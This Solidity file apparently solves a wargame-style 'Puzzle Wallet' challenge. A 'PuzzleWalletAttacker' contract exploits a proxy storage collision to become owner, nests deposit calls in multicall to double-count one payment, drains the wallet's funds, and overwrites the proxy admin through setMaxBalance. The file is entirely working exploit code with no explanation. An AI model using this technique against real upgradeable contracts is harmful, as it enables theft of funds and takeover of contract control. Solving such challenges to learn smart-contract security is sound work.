// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function multicall(bytes[] calldata data) external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletAttacker {
    IPuzzleWallet public instance;

    constructor(address _instance) public {
        instance = IPuzzleWallet(_instance);
    }

    function attack() public payable {
        instance.proposeNewAdmin(address(this));
        instance.addToWhitelist(address(this));

        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);

        bytes[] memory multiDepositCall = new bytes[](2);
        multiDepositCall[0] = depositCall[0];
        multiDepositCall[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, depositCall);

        instance.multicall{ value: 1e15 }(multiDepositCall);

        instance.execute(tx.origin, 2e15, "");
        instance.setMaxBalance(uint256(uint160(tx.origin)));
    }
}
